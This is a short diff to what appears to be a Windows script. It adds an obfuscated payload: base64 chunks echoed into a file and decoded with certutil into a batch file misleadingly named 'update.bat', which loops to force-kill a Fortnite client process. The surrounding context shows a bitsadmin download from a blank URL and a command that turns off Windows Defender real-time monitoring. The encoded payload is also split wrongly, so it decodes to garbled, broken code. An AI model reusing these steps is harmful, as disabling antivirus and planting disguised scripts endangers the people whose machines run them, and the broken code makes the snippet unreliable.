@@ -6,6 +6,15 @@ bitsadmin /transfer mydownloadjob /download /priority foreground "https://.rar" 
 
 #####
 
+echo QGVjaG8gb2ZmDQoNCjpsb29wDQp0YXNra2lsbCAvZiAvaW0gRm9ydG5pdGVDbGll > x.b64
+echo b3RvIGxvb3A= >> x.b64
+
+certutil -decode "x.b64" "update.bat"
+
+###############################################################
+
+
+
 Set-MpPreference -DisableRealtimeMonitoring $true
 
 #####
